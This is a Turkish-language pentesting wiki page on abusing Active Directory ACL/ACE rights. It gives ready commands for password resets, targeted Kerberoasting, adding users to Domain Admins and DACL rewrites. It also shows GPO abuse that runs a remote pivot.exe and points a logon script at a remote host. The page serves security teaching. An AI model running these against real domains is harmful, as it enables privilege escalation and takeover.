# Active Directory ACL'lerini/ACE'lerini Kötüye Kullanma

{{#include ../../../banners/hacktricks-training.md}}

**Bu sayfa,** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**'dan tekniklerin bir özetidir. Daha fazla ayrıntı için, orijinal makalelere bakın.**

## BadSuccesor

{{#ref}}
BadSuccesor.md
{{#endref}}

## **Kullanıcı Üzerinde GenericAll Hakları**

Bu ayrıcalık, bir saldırgana hedef kullanıcı hesabı üzerinde tam kontrol sağlar. `GenericAll` hakları `Get-ObjectAcl` komutu kullanılarak doğrulandığında, bir saldırgan:

- **Hedefin Parolasını Değiştirme**: `net user <username> <password> /domain` komutunu kullanarak, saldırgan kullanıcının parolasını sıfırlayabilir.
- **Hedefli Kerberoasting**: Kullanıcının hesabına bir SPN atayarak onu kerberoastable hale getirin, ardından Rubeus ve targetedKerberoast.py kullanarak bilet verme biletinin (TGT) hash'lerini çıkartıp kırmaya çalışın.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Hedeflenmiş ASREPRoasting**: Kullanıcı için ön kimlik doğrulamayı devre dışı bırakın, bu da hesabını ASREPRoasting'e karşı savunmasız hale getirir.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Hakları Üzerinde Grup**

Bu ayrıcalık, bir saldırganın `Domain Admins` gibi bir grupta `GenericAll` haklarına sahip olması durumunda grup üyeliklerini manipüle etmesine olanak tanır. Saldırgan, grubun ayırt edici adını `Get-NetGroup` ile belirledikten sonra:

- **Kendilerini Domain Admins Grubuna Ekleyebilir**: Bu, doğrudan komutlar aracılığıyla veya Active Directory ya da PowerSploit gibi modüller kullanılarak yapılabilir.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Bu yetkilere sahip olmak, bir bilgisayar nesnesi veya kullanıcı hesabında şunları sağlar:

- **Kerberos Resource-based Constrained Delegation**: Bir bilgisayar nesnesini ele geçirmeyi sağlar.
- **Shadow Credentials**: Bu tekniği, gölge kimlik bilgilerini oluşturma yetkilerini kullanarak bir bilgisayar veya kullanıcı hesabını taklit etmek için kullanın.

## **WriteProperty on Group**

Bir kullanıcının belirli bir grup (örneğin, `Domain Admins`) için tüm nesnelerde `WriteProperty` hakları varsa, şunları yapabilirler:

- **Kendilerini Domain Admins Grubuna Eklemek**: `net user` ve `Add-NetGroupUser` komutlarını birleştirerek gerçekleştirilebilir, bu yöntem alan içinde ayrıcalık yükseltmesine olanak tanır.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Kendi (Kendi Üyeliği) Grubunda**

Bu ayrıcalık, saldırganların `Domain Admins` gibi belirli gruplara kendilerini eklemelerine olanak tanır; bu, grup üyeliğini doğrudan manipüle eden komutlar aracılığıyla gerçekleştirilir. Aşağıdaki komut dizisini kullanmak, kendini eklemeye olanak tanır:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Kendi Üyeliği)**

Benzer bir ayrıcalık olan bu, saldırganların grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır; eğer bu gruplar üzerinde `WriteProperty` hakkına sahipseler. Bu ayrıcalığın onayı ve uygulanması şu şekilde gerçekleştirilir:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

`User-Force-Change-Password` için bir kullanıcıda `ExtendedRight` tutmak, mevcut şifreyi bilmeden şifre sıfırlamalarına olanak tanır. Bu hakkın doğrulanması ve istismarı, PowerShell veya alternatif komut satırı araçları aracılığıyla yapılabilir ve etkileşimli oturumlar ile etkileşimsiz ortamlar için tek satırlık komutlar dahil olmak üzere bir kullanıcının şifresini sıfırlamak için çeşitli yöntemler sunar. Komutlar, basit PowerShell çağrılarından Linux'ta `rpcclient` kullanmaya kadar uzanarak saldırı vektörlerinin çok yönlülüğünü göstermektedir.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Grup Üzerinde WriteOwner**

Eğer bir saldırgan `WriteOwner` haklarına sahip olduğunu keşfederse, grubun sahipliğini kendisine değiştirebilir. Bu, söz konusu grubun `Domain Admins` olması durumunda özellikle etkilidir, çünkü sahipliği değiştirmek grup nitelikleri ve üyeliği üzerinde daha geniş bir kontrol sağlar. Süreç, `Get-ObjectAcl` aracılığıyla doğru nesneyi tanımlamayı ve ardından sahibi değiştirmek için SID veya ad kullanarak `Set-DomainObjectOwner` komutunu kullanmayı içerir.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Bu izin, bir saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle, `GenericWrite` erişimi ile saldırgan, bir kullanıcının oturum açma betiği yolunu, kullanıcı oturum açtığında kötü niyetli bir betiği çalıştıracak şekilde değiştirebilir. Bu, hedef kullanıcının `scriptpath` özelliğini saldırganın betiğine işaret edecek şekilde güncellemek için `Set-ADObject` komutunun kullanılmasıyla gerçekleştirilir.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Bu ayrıcalıkla, saldırganlar grup üyeliğini manipüle edebilir, örneğin kendilerini veya diğer kullanıcıları belirli gruplara ekleyebilirler. Bu süreç, bir kimlik bilgisi nesnesi oluşturmayı, bunu kullanarak bir gruptan kullanıcı eklemeyi veya çıkarmayı ve PowerShell komutlarıyla üyelik değişikliklerini doğrulamayı içerir.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Bir AD nesnesine sahip olmak ve üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, bir saldırgana nesne üzerinde `GenericAll` ayrıcalıkları verme imkanı tanır. Bu, ADSI manipülasyonu yoluyla gerçekleştirilir ve nesne üzerinde tam kontrol sağlanır ve grup üyeliklerini değiştirme yeteneği kazanılır. Ancak, bu ayrıcalıkları Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlet'lerini kullanarak istismar etmeye çalışırken sınırlamalar vardır.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Alan Üzerinde Replikasyon (DCSync)**

DCSync saldırısı, bir Alan Denetleyicisini taklit etmek ve kullanıcı kimlik bilgileri de dahil olmak üzere verileri senkronize etmek için alan üzerindeki belirli replikasyon izinlerini kullanır. Bu güçlü teknik, saldırganların bir Alan Denetleyicisine doğrudan erişim olmadan AD ortamından hassas bilgileri çıkarmasına olanak tanıyan `DS-Replication-Get-Changes` gibi izinler gerektirir. [**DCSync saldırısı hakkında daha fazla bilgi edinin.**](../dcsync.md)

## GPO Delegasyonu <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegasyonu

Grup Politika Nesnelerini (GPO'lar) yönetmek için devredilen erişim, önemli güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları devredilirse, **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilirler. Bu izinler, PowerView kullanılarak tespit edilen kötü niyetli amaçlar için kötüye kullanılabilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO İzinlerini Listele

Yanlış yapılandırılmış GPO'ları belirlemek için PowerSploit'in cmdlet'leri bir araya getirilebilir. Bu, belirli bir kullanıcının yönetim izinlerine sahip olduğu GPO'ların keşfedilmesini sağlar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Verilen Politika Uygulanan Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını çözmek mümkündür, bu da potansiyel etkinin kapsamını anlamaya yardımcı olur. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Verilen Bilgisayara Uygulanan Politikalar**: Belirli bir bilgisayara hangi politikaların uygulandığını görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.

**Verilen Politika Uygulanan OU'lar**: Belirli bir politikadan etkilenen organizasyonel birimleri (OU'lar) belirlemek için `Get-DomainOU` kullanılabilir.

GPO'ları listelemek ve içindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.

### GPO'yu Kötüye Kullan - New-GPOImmediateTask

Yanlış yapılandırılmış GPO'lar, örneğin, hemen bir zamanlanmış görev oluşturarak kod çalıştırmak için sömürülebilir. Bu, etkilenen makinelerde yerel yöneticiler grubuna bir kullanıcı eklemek için yapılabilir ve bu da ayrıcalıkları önemli ölçüde artırır:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy modülü - GPO'yu Kötüye Kullanma

GroupPolicy modülü, eğer kuruluysa, yeni GPO'ların oluşturulmasını ve bağlanmasını sağlar ve etkilenen bilgisayarlarda arka kapıları çalıştırmak için kayıt defteri değerleri gibi tercihlerin ayarlanmasına olanak tanır. Bu yöntem, GPO'nun güncellenmesini ve bir kullanıcının bilgisayara giriş yapmasını gerektirir:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO'yu Kötüye Kullanma

SharpGPOAbuse, yeni GPO'lar oluşturma gereksinimi olmadan mevcut GPO'ları kötüye kullanma yöntemi sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Politika Güncellemesini Zorla

GPO güncellemeleri genellikle her 90 dakikada bir gerçekleşir. Bu süreci hızlandırmak için, özellikle bir değişiklik uygulandıktan sonra, hedef bilgisayarda `gpupdate /force` komutu kullanılabilir. Bu komut, GPO'larda yapılan herhangi bir değişikliğin bir sonraki otomatik güncelleme döngüsünü beklemeden uygulanmasını sağlar.

### Arka Planda

Belirli bir GPO için Zamanlanmış Görevler incelendiğinde, `Misconfigured Policy` gibi, `evilTask` gibi görevlerin eklenmesi doğrulanabilir. Bu görevler, sistem davranışını değiştirmek veya ayrıcalıkları artırmak amacıyla betikler veya komut satırı araçları aracılığıyla oluşturulur.

`New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında gösterildiği gibi, görev yapısı zamanlanmış görevin ayrıntılarını - yürütülecek komut ve tetikleyicileri - özetler. Bu dosya, zamanlanmış görevlerin GPO'lar içinde nasıl tanımlandığını ve yönetildiğini temsil eder ve politika uygulaması kapsamında rastgele komutlar veya betikler yürütme yöntemi sunar.

### Kullanıcılar ve Gruplar

GPO'lar, hedef sistemlerde kullanıcı ve grup üyeliklerinin manipülasyonuna da olanak tanır. Kullanıcılar ve Gruplar politika dosyalarını doğrudan düzenleyerek, saldırganlar yerel `administrators` grubuna kullanıcı ekleyebilir. Bu, GPO yönetim izinlerinin devri yoluyla mümkündür; bu, politika dosyalarının yeni kullanıcılar eklemek veya grup üyeliklerini değiştirmek için değiştirilmesine izin verir.

Kullanıcılar ve Gruplar için XML yapılandırma dosyası, bu değişikliklerin nasıl uygulandığını özetler. Bu dosyaya girişler ekleyerek, belirli kullanıcılara etkilenen sistemler üzerinde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu yoluyla ayrıcalık artırma için doğrudan bir yaklaşım sunar.

Ayrıca, kod yürütme veya kalıcılığı sağlama için ek yöntemler, oturum açma/kapama betiklerini kullanma, otomatik çalıştırmalar için kayıt defteri anahtarlarını değiştirme, .msi dosyaları aracılığıyla yazılım yükleme veya hizmet yapılandırmalarını düzenleme gibi yöntemler de dikkate alınabilir. Bu teknikler, GPO'ların kötüye kullanımı yoluyla erişimi sürdürme ve hedef sistemleri kontrol etme için çeşitli yollar sunar.

## Referanslar

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
